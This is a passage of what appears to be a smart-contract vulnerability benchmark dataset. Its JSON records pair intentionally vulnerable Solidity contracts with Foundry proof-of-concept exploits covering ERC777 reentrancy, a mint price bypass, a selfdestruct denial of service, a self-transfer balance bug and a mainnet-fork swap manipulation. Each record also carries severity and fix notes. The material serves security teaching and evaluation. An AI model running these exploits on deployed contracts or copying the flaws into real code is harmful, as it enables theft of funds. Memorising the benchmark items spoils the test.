tokenAddress,\n        uint256 tokenAmount\n    ) external onlyOwner {\n        require(\n            tokenAddress != address(rewardsToken),\n            \"Cannot withdraw the rewardsToken\"\n        );\n        IERC20(tokenAddress).safeTransfer(owner, tokenAmount);\n        emit Recovered(tokenAddress, tokenAmount);\n    }\n}\n\ncontract RewardToken is ERC20, Ownable {\n    constructor() ERC20(\"Rewardoken\", \"Reward\") {\n        _mint(msg.sender, 10000 * 10 ** decimals());\n    }\n}\n",
    "vulnerable_contract_only": "contract VulnStakingRewards {\n    using SafeERC20 for IERC20;\n\n    IERC20 public rewardsToken;\n    address public owner;\n\n    event Recovered(address token, uint256 amount);\n\n    constructor(address _rewardsToken) {\n        rewardsToken = IERC20(_rewardsToken);\n        owner = msg.sender;\n    }\n\n    modifier onlyOwner() {\n        require(msg.sender == owner, \"Only owner can call this function\");\n        _;\n    }\n\n    function recoverERC20(\n        address tokenAddress,\n        uint256 tokenAmount\n    ) public onlyOwner {\n        IERC20(tokenAddress).safeTransfer(owner, tokenAmount);\n        emit Recovered(tokenAddress, tokenAmount);\n    }\n}\n\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "logic_error",
    "severity": "medium",
    "difficulty_tier": 2,
    "vulnerability_name": "Incorrect implementation of the recoverERC20() function in the StakingRewards",
    "description": "The recoverERC20() function in StakingRewards.sol can potentially serve as a backdoor for the owner to retrieve rewardsToken.\nThere is no corresponding check against the rewardsToken. This creates an administrative privilege where the owner can sweep the rewards tokens, potentially using it as a means to exploit depositors.\nIt's similar to a forked issue if you forked vulnerable code.",
    "scenario": "",
    "fix_description": "disallowing recovery of the rewardToken within the recoverErc20 function",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": true,
    "context_level": "single_file",
    "original_source_path": "src/test/recoverERC20.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_erc777-reentrancy",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "ERC777-reentrancy.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/token/ERC777/ERC777.sol\";\n\n/*\nName: ERC777 Reentrancy Vulnerability\n\nDescription:\nERC777 tokens allow arbitrary callbacks via hooks that are called during token transfers.\nMalicious contract addresses may cause reentrancy on such callbacks if reentrancy guards are not used. \n\nScenario:\nMaximum claims is 1,000 for each EOA, How can you bypass this limitation?\n\nMitigation:\nFollow check-effect-interaction and use OpenZeppelin Reentrancy Guard.\n\nREF\nhttps://medium.com/cream-finance/c-r-e-a-m-finance-post-mortem-amp-exploit-6ceb20a630c5\n\n*/\n\ncontract ContractTest is Test {\n    MyERC777 MyERC777TokenContract;\n    SimpleBank SimpleBankContract;\n    address alice = vm.addr(1);\n    address eve = vm.addr(2);\n    bytes32 private constant _TOKENS_SENDER_INTERFACE_HASH =\n        keccak256(\"ERC777TokensSender\");\n    bytes32 private constant _TOKENS_RECIPIENT_INTERFACE_HASH =\n        keccak256(\"ERC777TokensRecipient\");\n\n    function setUp() external {\n        // mock ERC1820Registry contract in foundry\n        vm.etch(\n            address(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24),\n            bytes(\n                hex\"608060405234801561001057600080fd5b50600436106100a5576000357c010000000000000000000000000000000000000000000000000000000090048063a41e7d5111610078578063a41e7d51146101d4578063aabbb8ca1461020a578063b705676514610236578063f712f3e814610280576100a5565b806329965a1d146100aa5780633d584063146100e25780635df8122f1461012457806365ba36c114610152575b600080fd5b6100e0600480360360608110156100c057600080fd5b50600160a060020a038135811691602081013591604090910135166102b6565b005b610108600480360360208110156100f857600080fd5b5035600160a060020a0316610570565b60408051600160a060020a039092168252519081900360200190f35b6100e06004803603604081101561013a57600080fd5b50600160a060020a03813581169160200135166105bc565b6101c26004803603602081101561016857600080fd5b81019060208101813564010000000081111561018357600080fd5b82018360208201111561019557600080fd5b803590602001918460018302840111640100000000831117156101b757600080fd5b5090925090506106b3565b60408051918252519081900360200190f35b6100e0600480360360408110156101ea57600080fd5b508035600160a060020a03169060200135600160e060020a0319166106ee565b6101086004803603604081101561022057600080fd5b50600160a060020a038135169060200135610778565b61026c6004803603604081101561024c57600080fd5b508035600160a060020a03169060200135600160e060020a0319166107ef565b604080519115158252519081900360200190f35b61026c6004803603604081101561029657600080fd5b508035600160a060020a03169060200135600160e060020a0319166108aa565b6000600160a060020a038416156102cd57836102cf565b335b9050336102db82610570565b600160a060020a031614610339576040805160e560020a62461bcd02815260206004820152600f60248201527f4e6f7420746865206d616e616765720000000000000000000000000000000000604482015290519081900360640190fd5b6103428361092a565b15610397576040805160e560020a62461bcd02815260206004820152601a60248201527f4d757374206e6f7420626520616e204552433136352068617368000000000000604482015290519081900360640190fd5b600160a060020a038216158015906103b85750600160a060020a0382163314155b156104ff5760405160200180807f455243313832305f4143434550545f4d4147494300000000000000000000000081525060140190506040516020818303038152906040528051906020012082600160a060020a031663249cb3fa85846040518363ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004018083815260200182600160a060020a0316600160a060020a031681526020019250505060206040518083038186803b15801561047e57600080fd5b505afa158015610492573d6000803e3d6000fd5b505050506040513d60208110156104a857600080fd5b5051146104ff576040805160e560020a62461bcd02815260206004820181905260248201527f446f6573206e6f7420696d706c656d656e742074686520696e74657266616365604482015290519081900360640190fd5b600160a060020a03818116600081815260208181526040808320888452909152808220805473ffffffffffffffffffffffffffffffffffffffff19169487169485179055518692917f93baa6efbd2244243bfee6ce4cfdd1d04fc4c0e9a786abd3a41313bd352db15391a450505050565b600160a060020a03818116600090815260016020526040812054909116151561059a5750806105b7565b50600160a060020a03808216600090815260016020526040902054165b919050565b336105c683610570565b600160a060020a031614610624576040805160e560020a62461bcd02815260206004820152600f60248201527f4e6f7420746865206d616e616765720000000000000000000000000000000000604482015290519081900360640190fd5b81600160a060020a031681600160a060020a0316146106435780610646565b60005b600160a060020a03838116600081815260016020526040808220805473ffffffffffffffffffffffffffffffffffffffff19169585169590951790945592519184169290917f605c2dbf762e5f7d60a546d42e7205dcb1b011ebc62a61736a57c9089d3a43509190a35050565b600082826040516020018083838082843780830192505050925050506040516020818303038152906040528051906020012090505b92915050565b6106f882826107ef565b610703576000610705565b815b600160a060020a03928316600081815260208181526040808320600160e060020a031996909616808452958252808320805473ffffffffffffffffffffffffffffffffffffffff19169590971694909417909555908152600284528181209281529190925220805460ff19166001179055565b600080600160a060020a038416156107905783610792565b335b905061079d8361092a565b156107c357826107ad82826108aa565b6107b85760006107ba565b815b925050506106e8565b600160a060020a0390811660009081526020818152604080832086845290915290205416905092915050565b6000808061081d857f01ffc9a70000000000000000000000000000000000000000000000000000000061094c565b909250905081158061082d575080155b1561083d576000925050506106e8565b61084f85600160e060020a031961094c565b909250905081158061086057508015155b15610870576000925050506106e8565b61087a858561094c565b909250905060018214801561088f5750806001145b1561089f576001925050506106e8565b506000949350505050565b600160a060020a0382166000908152600260209081526040808320600160e060020a03198516845290915281205460ff1615156108f2576108eb83836107ef565b90506106e8565b50600160a060020a03808316600081815260208181526040808320600160e060020a0319871684529091529020549091161492915050565b7bffffffffffffffffffffffffffffffffffffffffffffffffffffffff161590565b6040517f01ffc9a7000000000000000000000000000000000000000000000000000000008082526004820183905260009182919060208160248189617530fa90519096909550935050505056fea165627a7a72305820377f4a2d4301ede9949f163f319021a6e9c687c292a5e2b2c4734c126b524e6c0029\"\n            )\n        );\n        MyERC777TokenContract = new MyERC777(0);\n    }\n\n    function testERC777Reentrancy() public {\n        // Register IERC1820Registry\n        IERC1820Registry registry = IERC1820Registry(\n            address(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24)\n        );\n        // tokensReceived Hook\n        // The token contract MUST call the tokensReceived hook of the recipient if the recipient registers an ERC777TokensRecipient implementation via ERC-1820.\n        registry.setInterfaceImplementer(\n            address(this),\n            _TOKENS_RECIPIENT_INTERFACE_HASH,\n            address(this)\n        );\n        //set up env\n        SimpleBankContract = new SimpleBank(address(MyERC777TokenContract));\n        MyERC777TokenContract.mint(address(SimpleBankContract), 10000, \"\", \"\");\n\n        console.log(\n            \"Maximum claims is 1,000 for each EOA, How can you bypass this limitation?\"\n        );\n        console.log(\n            \"Before exploiting, My GLD Balance :\",\n            MyERC777TokenContract.balanceOf(address(this))\n        );\n        SimpleBankContract.claim(address(this), 900); // claim token to trigger callback function `tokensReceived()`.\n        // Expect 900 (the claim amount), but we will get the 1,900 due to reenter to claim 1,000.\n        console.log(\n            \"After exploiting, My GLD Balance :\",\n            MyERC777TokenContract.balanceOf(address(this))\n        );\n    }\n\n    function tokensReceived(\n        address payable operator,\n        address from,\n        address to,\n        uint256 amount,\n        bytes calldata data,\n        bytes calldata operatorData\n    ) external {\n        if (MyERC777TokenContract.balanceOf(address(this)) <= 1000) {\n            console.log(\"Reentered\");\n            // exploit here, claim 1,000 tokens.\n            SimpleBank(operator).claim(address(this), 1000);\n        }\n    }\n\n    receive() external payable {}\n}\n\ncontract MyERC777 is ERC777 {\n    constructor(\n        uint256 initialSupply\n    ) ERC777(\"Gold\", \"GLD\", new address[](0)) {}\n    function mint(\n        address account,\n        uint256 amount,\n        bytes memory userData,\n        bytes memory operatorData\n    ) public returns (bool) {\n        _mint(account, amount, userData, operatorData);\n        return true;\n    }\n}\n\ncontract SimpleBank is Test {\n    ERC777 private token;\n    uint maxMintsPerAddress = 1000;\n    mapping(address => uint256) public _mints;\n    bytes32 private constant _TOKENS_RECIPIENT_INTERFACE_HASH =\n        keccak256(\"ERC777TokensRecipient\");\n\n    function setUp() external {\n        // mock ERC1820Registry contract in foundry\n        vm.etch(\n            address(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24),\n            bytes(\n                hex\"608060405234801561001057600080fd5b50600436106100a5576000357c010000000000000000000000000000000000000000000000000000000090048063a41e7d5111610078578063a41e7d51146101d4578063aabbb8ca1461020a578063b705676514610236578063f712f3e814610280576100a5565b806329965a1d146100aa5780633d584063146100e25780635df8122f1461012457806365ba36c114610152575b600080fd5b6100e0600480360360608110156100c057600080fd5b50600160a060020a038135811691602081013591604090910135166102b6565b005b610108600480360360208110156100f857600080fd5b5035600160a060020a0316610570565b60408051600160a060020a039092168252519081900360200190f35b6100e06004803603604081101561013a57600080fd5b50600160a060020a03813581169160200135166105bc565b6101c26004803603602081101561016857600080fd5b81019060208101813564010000000081111561018357600080fd5b82018360208201111561019557600080fd5b803590602001918460018302840111640100000000831117156101b757600080fd5b5090925090506106b3565b60408051918252519081900360200190f35b6100e0600480360360408110156101ea57600080fd5b508035600160a060020a03169060200135600160e060020a0319166106ee565b6101086004803603604081101561022057600080fd5b50600160a060020a038135169060200135610778565b61026c6004803603604081101561024c57600080fd5b508035600160a060020a03169060200135600160e060020a0319166107ef565b604080519115158252519081900360200190f35b61026c6004803603604081101561029657600080fd5b508035600160a060020a03169060200135600160e060020a0319166108aa565b6000600160a060020a038416156102cd57836102cf565b335b9050336102db82610570565b600160a060020a031614610339576040805160e560020a62461bcd02815260206004820152600f60248201527f4e6f7420746865206d616e616765720000000000000000000000000000000000604482015290519081900360640190fd5b6103428361092a565b15610397576040805160e560020a62461bcd02815260206004820152601a60248201527f4d757374206e6f7420626520616e204552433136352068617368000000000000604482015290519081900360640190fd5b600160a060020a038216158015906103b85750600160a060020a0382163314155b156104ff5760405160200180807f455243313832305f4143434550545f4d4147494300000000000000000000000081525060140190506040516020818303038152906040528051906020012082600160a060020a031663249cb3fa85846040518363ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004018083815260200182600160a060020a0316600160a060020a031681526020019250505060206040518083038186803b15801561047e57600080fd5b505afa158015610492573d6000803e3d6000fd5b505050506040513d60208110156104a857600080fd5b5051146104ff576040805160e560020a62461bcd02815260206004820181905260248201527f446f6573206e6f7420696d706c656d656e742074686520696e74657266616365604482015290519081900360640190fd5b600160a060020a03818116600081815260208181526040808320888452909152808220805473ffffffffffffffffffffffffffffffffffffffff19169487169485179055518692917f93baa6efbd2244243bfee6ce4cfdd1d04fc4c0e9a786abd3a41313bd352db15391a450505050565b600160a060020a03818116600090815260016020526040812054909116151561059a5750806105b7565b50600160a060020a03808216600090815260016020526040902054165b919050565b336105c683610570565b600160a060020a031614610624576040805160e560020a62461bcd02815260206004820152600f60248201527f4e6f7420746865206d616e616765720000000000000000000000000000000000604482015290519081900360640190fd5b81600160a060020a031681600160a060020a0316146106435780610646565b60005b600160a060020a03838116600081815260016020526040808220805473ffffffffffffffffffffffffffffffffffffffff19169585169590951790945592519184169290917f605c2dbf762e5f7d60a546d42e7205dcb1b011ebc62a61736a57c9089d3a43509190a35050565b600082826040516020018083838082843780830192505050925050506040516020818303038152906040528051906020012090505b92915050565b6106f882826107ef565b610703576000610705565b815b600160a060020a03928316600081815260208181526040808320600160e060020a031996909616808452958252808320805473ffffffffffffffffffffffffffffffffffffffff19169590971694909417909555908152600284528181209281529190925220805460ff19166001179055565b600080600160a060020a038416156107905783610792565b335b905061079d8361092a565b156107c357826107ad82826108aa565b6107b85760006107ba565b815b925050506106e8565b600160a060020a0390811660009081526020818152604080832086845290915290205416905092915050565b6000808061081d857f01ffc9a70000000000000000000000000000000000000000000000000000000061094c565b909250905081158061082d575080155b1561083d576000925050506106e8565b61084f85600160e060020a031961094c565b909250905081158061086057508015155b15610870576000925050506106e8565b61087a858561094c565b909250905060018214801561088f5750806001145b1561089f576001925050506106e8565b506000949350505050565b600160a060020a0382166000908152600260209081526040808320600160e060020a03198516845290915281205460ff1615156108f2576108eb83836107ef565b90506106e8565b50600160a060020a03808316600081815260208181526040808320600160e060020a0319871684529091529020549091161492915050565b7bffffffffffffffffffffffffffffffffffffffffffffffffffffffff161590565b6040517f01ffc9a7000000000000000000000000000000000000000000000000000000008082526004820183905260009182919060208160248189617530fa90519096909550935050505056fea165627a7a72305820377f4a2d4301ede9949f163f319021a6e9c687c292a5e2b2c4734c126b524e6c0029\"\n            )\n        );\n    }\n    constructor(address nftAddress) {\n        token = ERC777(nftAddress);\n\n        // Register IERC1820Registry\n        IERC1820Registry registry = IERC1820Registry(\n            address(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24)\n        );\n        registry.setInterfaceImplementer(\n            address(this),\n            _TOKENS_RECIPIENT_INTERFACE_HASH,\n            address(this)\n        );\n    }\n\n    function claim(address account, uint256 amount) public returns (bool) {\n        // Check if total claims for the address would exceed max mints per address.\n        require(\n            _mints[account] + amount <= maxMintsPerAddress,\n            \"Exceeds max mints per address\"\n        );\n\n        token.transfer(account, amount);\n        _mints[account] += amount; // Do not follow check-effect-interaction\n\n        return true;\n    }\n\n    function tokensReceived(\n        address operator,\n        address from,\n        address to,\n        uint256 amount,\n        bytes calldata data,\n        bytes calldata operatorData\n    ) external {}\n    receive() external payable {}\n}\n",
    "vulnerable_contract_only": "contract MyERC777 {\n    constructor(\n        uint256 initialSupply\n    ) ERC777(\"Gold\", \"GLD\", new address[](0)) {}\n    function mint(\n        address account,\n        uint256 amount,\n        bytes memory userData,\n        bytes memory operatorData\n    ) public returns (bool) {\n        _mint(account, amount, userData, operatorData);\n        return true;\n    }\n}\n\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "reentrancy",
    "severity": "critical",
    "difficulty_tier": 4,
    "vulnerability_name": "ERC777 Reentrancy Vulnerability",
    "description": "ERC777 tokens allow arbitrary callbacks via hooks that are called during token transfers.\nMalicious contract addresses may cause reentrancy on such callbacks if reentrancy guards are not used.",
    "scenario": "Maximum claims is 1,000 for each EOA, How can you bypass this limitation?",
    "fix_description": "Follow check-effect-interaction and use OpenZeppelin Reentrancy Guard.",
    "references": [
      "https://medium.com/cream-finance/c-r-e-a-m-finance-post-mortem-amp-exploit-6ceb20a630c5"
    ],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "intra_contract",
    "original_source_path": "src/test/ERC777-reentrancy.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_immunefi_ch1",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Immunefi_ch1.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/token/ERC721/ERC721.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/utils/Counters.sol\";\n\n// Immunefi #spotthebugchallenge!\n// https://twitter.com/immunefi/status/1557301712549023745\n\ncontract ContractTest is Test {\n    HerToken HerTokenContract;\n\n    function testSafeMint() public {\n        HerTokenContract = new HerToken();\n\n        HerTokenContract.safeMint{value: 1 ether}(address(this), 10);\n        console.log(\n            \"Due to incorrect check msg.value, we can mint many NFTs with 1 Eth.\"\n        );\n        console.log(\"NFT minted:\", HerTokenContract.balanceOf(address(this)));\n    }\n\n    function onERC721Received(\n        address,\n        address,\n        uint256,\n        bytes memory\n    ) public returns (bytes4) {\n        //   HerTokenContract.safeMint{value: 1 ether}(address(this),30);\n        return this.onERC721Received.selector;\n    }\n\n    receive() external payable {}\n}\n\ncontract HerToken is ERC721, Ownable, Test {\n    uint128 constant MINT_PRICE = 1 ether;\n    uint128 constant MAX_SUPPLY = 10000;\n    uint mintIndex;\n    using Counters for Counters.Counter;\n    Counters.Counter private _tokenIdCounter;\n\n    constructor() payable ERC721(\"HarToken\", \"HRT\") {}\n\n    function safeMint(address to, uint256 amount) public payable {\n        require(\n            _tokenIdCounter.current() + amount < MAX_SUPPLY,\n            \"Cannot mint given amount.\"\n        );\n        require(amount > 0, \"Must give a mint amount.\");\n        //fix require(msg.value >= MINT_PRICE * amount, \"Insufficient Ether.\");\n        // before the loop\n        for (uint256 i = 0; i < amount; i++) {\n            require(msg.value >= MINT_PRICE, \"Insufficient Ether.\");\n\n            mintIndex = _tokenIdCounter.current();\n            console.log(\"mintIndex\", mintIndex);\n            _safeMint(to, mintIndex); // no reentrancy issue, because we can not control tokenid.\n            _tokenIdCounter.increment();\n        }\n    }\n}\n",
    "vulnerable_contract_only": "contract HerToken {\n    uint128 constant MINT_PRICE = 1 ether;\n    uint128 constant MAX_SUPPLY = 10000;\n    uint mintIndex;\n    using Counters for Counters.Counter;\n    Counters.Counter private _tokenIdCounter;\n\n    constructor() payable ERC721(\"HarToken\", \"HRT\") {}\n\n    function safeMint(address to, uint256 amount) public payable {\n        require(\n            _tokenIdCounter.current() + amount < MAX_SUPPLY,\n            \"Cannot mint given amount.\"\n        );\n        require(amount > 0, \"Must give a mint amount.\");\n        //fix require(msg.value >= MINT_PRICE * amount, \"Insufficient Ether.\");\n        // before the loop\n        for (uint256 i = 0; i < amount; i++) {\n            require(msg.value >= MINT_PRICE, \"Insufficient Ether.\");\n\n            mintIndex = _tokenIdCounter.current();\n            console.log(\"mintIndex\", mintIndex);\n            _safeMint(to, mintIndex); // no reentrancy issue, because we can not control tokenid.\n            _tokenIdCounter.increment();\n        }\n    }\n}\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "logic_error",
    "severity": "medium",
    "difficulty_tier": 2,
    "vulnerability_name": "",
    "description": "",
    "scenario": "",
    "fix_description": "",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "single_file",
    "original_source_path": "src/test/Immunefi_ch1.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_sensefinance_exp",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "SenseFinance_exp.sol",
    "file_content": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// this excersise is about direct token manipulation\n\ninterface ISpace {\n    function onSwap(\n        SwapRequest memory request,\n        uint256 reservesTokenIn,\n        uint256 reservesTokenOut\n    ) external returns (uint256);\n\n    struct SwapRequest {\n        IVault.SwapKind kind;\n        IERC20 tokenIn;\n        IERC20 tokenOut;\n        uint256 amount;\n        // Misc data\n        bytes32 poolId;\n        uint256 lastChangeBlock;\n        address from;\n        address to;\n        bytes userData;\n    }\n}\n\ninterface IVault {\n    enum SwapKind {\n        GIVEN_IN,\n        GIVEN_OUT\n    }\n}\n\ncontract ContractTest is DSTest {\n    ISpace space = ISpace(0x3f9FEe026fCebb40719A69416C72B714d89a17d9);\n    IVault.SwapKind kind = IVault.SwapKind(0);\n    ISpace.SwapRequest aad =\n        ISpace.SwapRequest(\n            kind,\n            IERC20(0x3f9FEe026fCebb40719A69416C72B714d89a17d9),\n            IERC20(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0),\n            2000000000000000000,\n            0x3f9fee026fcebb40719a69416c72b714d89a17d900020000000000000000017c,\n            15017009,\n            address(this),\n            address(this),\n            \"\"\n        );\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 15017009); //fork mainnet at block 15017009\n    }\n\n    function testExploit() public {\n        //onswap:reservesTokenIn, reservesTokenOut;\n        console.log(\n            \"Amount Calculated:\",\n            space.onSwap(\n                aad,\n                60000000000000000000000000000000,\n                20000000000000000000000000\n            )\n        ); //744039785002747962\n        console.log(\n            \"Manipulated Amount Calculated:\",\n            space.onSwap(aad, 2000000000000000000, 2000000000000000000)\n        ); //1860147027671744844\n    }\n}\n",
    "vulnerable_contract_only": "see full file",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "logic_error",
    "severity": "medium",
    "difficulty_tier": 3,
    "vulnerability_name": "",
    "description": "",
    "scenario": "",
    "fix_description": "",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "intra_contract",
    "original_source_path": "src/test/SenseFinance_exp.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_selfdestruct",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Selfdestruct.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Self-Destruct Vulnerability\n\nDescription:\nThe EtherGame Self-Destruct Vulnerability is a flaw in the smart contract code that allows an attacker \nto disrupt the game by causing the EtherGame contract to self-destruct (using the selfdestruct opcode). \nThe vulnerability arises due to the dos function in the Attack contract, which performs a self-destruct\noperation on the EtherGame contract after receiving a significant amount of Ether. As a result of the self-destruct, \nthe EtherGame contract's functionality is permanently disabled, making it impossible for anyone to deposit or claim the winner's reward.\n\nScenario:\n1. Deploy EtherGame\n2. Players (say Alice and Bob) decides to play, deposits 1 Ether each.\n2. Deploy Attack with address of EtherGame\n3. Call Attack.attack sending 5 ether. This will break the game No one can become the winner.\n\nWhat happened?\nAttack forced the balance of EtherGame to equal 7 ether.\nNow no one can deposit and the winner cannot be set.\nDue to missing or insufficient access controls, malicious parties can self-destruct the contract.\nThe selfdestruct(address) function removes all bytecode from the contract address and sends all ether stored to the specified address.\n\nMitigation:\nInstead of relying on this.balance to track the deposited Ether, \nuse a state variable to keep track of the total deposited amount.\n*/\n\ncontract EtherGame {\n    uint public constant targetAmount = 7 ether;\n    address public winner;\n\n    function deposit() public payable {\n        require(msg.value == 1 ether, \"You can only send 1 Ether\");\n\n        uint balance = address(this).balance; // vulnerable\n        require(balance <= targetAmount, \"Game is over\");\n\n        if (balance == targetAmount) {\n            winner = msg.sender;\n        }\n    }\n\n    function claimReward() public {\n        require(msg.sender == winner, \"Not winner\");\n\n        (bool sent, ) = msg.sender.call{value: address(this).balance}(\"\");\n        require(sent, \"Failed to send Ether\");\n    }\n}\n\ncontract ContractTest is Test {\n    EtherGame EtherGameContract;\n    Attack AttackerContract;\n    address alice;\n    address eve;\n\n    function setUp() public {\n        EtherGameContract = new EtherGame();\n        alice = vm.addr(1);\n        eve = vm.addr(2);\n        vm.deal(address(alice), 1 ether);\n        vm.deal(address(eve), 1 ether);\n    }\n\n    function testSelfdestruct() public {\n        console.log(\"Alice balance\", alice.balance);\n        console.log(\"Eve balance\", eve.balance);\n\n        console.log(\"Alice deposit 1 Ether...\");\n        vm.prank(alice);\n        EtherGameContract.deposit{value: 1 ether}();\n\n        console.log(\"Eve deposit 1 Ether...\");\n        vm.prank(eve);\n        EtherGameContract.deposit{value: 1 ether}();\n\n        console.log(\n            \"Balance of EtherGameContract\",\n            address(EtherGameContract).balance\n        );\n\n        console.log(\"Attack...\");\n        AttackerContract = new Attack(EtherGameContract);\n        AttackerContract.dos{value: 5 ether}();\n\n        console.log(\n            \"Balance of EtherGameContract\",\n            address(EtherGameContract).balance\n        );\n        console.log(\"Exploit completed, Game is over\");\n        EtherGameContract.deposit{value: 1 ether}(); // This call will fail due to contract destroyed.\n    }\n}\n\ncontract Attack {\n    EtherGame etherGame;\n\n    constructor(EtherGame _etherGame) {\n        etherGame = EtherGame(_etherGame);\n    }\n\n    function dos() public payable {\n        // You can simply break the game by sending ether so that\n        // the game balance >= 7 ether\n\n        // cast address to payable\n        address payable addr = payable(address(etherGame));\n        selfdestruct(addr);\n    }\n}\n",
    "vulnerable_contract_only": "contract EtherGame {\n    uint public constant targetAmount = 7 ether;\n    address public winner;\n\n    function deposit() public payable {\n        require(msg.value == 1 ether, \"You can only send 1 Ether\");\n\n        uint balance = address(this).balance; // vulnerable\n        require(balance <= targetAmount, \"Game is over\");\n\n        if (balance == targetAmount) {\n            winner = msg.sender;\n        }\n    }\n\n    function claimReward() public {\n        require(msg.sender == winner, \"Not winner\");\n\n        (bool sent, ) = msg.sender.call{value: address(this).balance}(\"\");\n        require(sent, \"Failed to send Ether\");\n    }\n}\n\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "selfdestruct",
    "severity": "critical",
    "difficulty_tier": 2,
    "vulnerability_name": "Self-Destruct Vulnerability",
    "description": "The EtherGame Self-Destruct Vulnerability is a flaw in the smart contract code that allows an attacker \nto disrupt the game by causing the EtherGame contract to self-destruct (using the selfdestruct opcode). \nThe vulnerability arises due to the dos function in the Attack contract, which performs a self-destruct\noperation on the EtherGame contract after receiving a significant amount of Ether. As a result of the self-destruct, \nthe EtherGame contract's functionality is permanently disabled, making it impossible for anyone to deposit or claim the winner's reward.",
    "scenario": "1. Deploy EtherGame\n2. Players (say Alice and Bob) decides to play, deposits 1 Ether each.\n2. Deploy Attack with address of EtherGame\n3. Call Attack.attack sending 5 ether. This will break the game No one can become the winner.\n\nWhat happened?\nAttack forced the balance of EtherGame to equal 7 ether.\nNow no one can deposit and the winner cannot be set.\nDue to missing or insufficient access controls, malicious parties can self-destruct the contract.\nThe selfdestruct(address) function removes all bytecode from the contract address and sends all ether stored to the specified address.",
    "fix_description": "Instead of relying on this.balance to track the deposited Ether, \nuse a state variable to keep track of the total deposited amount.",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "single_file",
    "original_source_path": "src/test/Selfdestruct.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_self-transfer",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "self-transfer.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Missing Check for Self-Transfer Allows Funds to be Lost\n\nDescription:\nThe vulnerability in the code stems from the absence of a check to prevent self-transfers. \nThis oversight allows the transfer function to erroneously transfer funds to the same address. \nConsequently, funds are lost as the code fails to deduct the transferred amount from the sender's balance.\nThis vulnerability undermines the correctness of fund transfers within the contract and poses a risk \nto the integrity of user balances.\n \nMitigation:  \nAdd condition to prevent transfer between same addresses\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1679373800327241728\nhttps://github.com/code-423n4/2022-10-traderjoe-findings/issues/299\nhttps://www.immunebytes.com/blog/bzxs-security-focused-relaunch-followed-by-a-hack-how/\n*/\n\ncontract ContractTest is Test {\n    SimpleBank VSimpleBankContract;\n    FixedSimpleBank FixedSimpleBankContract;\n\n    function setUp() public {\n        VSimpleBankContract = new SimpleBank();\n        FixedSimpleBankContract = new FixedSimpleBank();\n    }\n\n    function testSelfTransfer() public {\n        VSimpleBankContract.transfer(address(this), address(this), 10000);\n        VSimpleBankContract.transfer(address(this), address(this), 10000);\n        VSimpleBankContract.balanceOf(address(this));\n        /*\n        unchecked {\n        _balances[_id][Alice] = 10000 - 10000;\n        _balances[_id][Alice] = 10000 + 10000;\n         total balance of [Alice] = 20000\n        }\n        */\n    }\n\n    function testFixedSelfTransfer() public {\n        vm.expectRevert(\"Cannot transfer funds to the same address.\");\n        FixedSimpleBankContract.transfer(address(this), address(this), 10000);\n    }\n\n    receive() external payable {}\n}\n\ncontract SimpleBank {\n    mapping(address => uint256) private _balances;\n\n    function balanceOf(address _account) public view virtual returns (uint256) {\n        return _balances[_account];\n    }\n\n    function transfer(address _from, address _to, uint256 _amount) public {\n        // not check self-transfer\n        uint256 _fromBalance = _balances[_from];\n        uint256 _toBalance = _balances[_to];\n\n        unchecked {\n            _balances[_from] = _fromBalance - _amount;\n            _balances[_to] = _toBalance + _amount;\n        }\n    }\n}\n\ncontract FixedSimpleBank {\n    mapping(address => uint256) private _balances;\n\n    function balanceOf(address _account) public view virtual returns (uint256) {\n        return _balances[_account];\n    }\n\n    function transfer(address _from, address _to, uint256 _amount) public {\n        //Mitigation\n        require(_from != _to, \"Cannot transfer funds to the same address.\");\n\n        uint256 _fromBalance = _balances[_from];\n        uint256 _toBalance = _balances[_to];\n\n        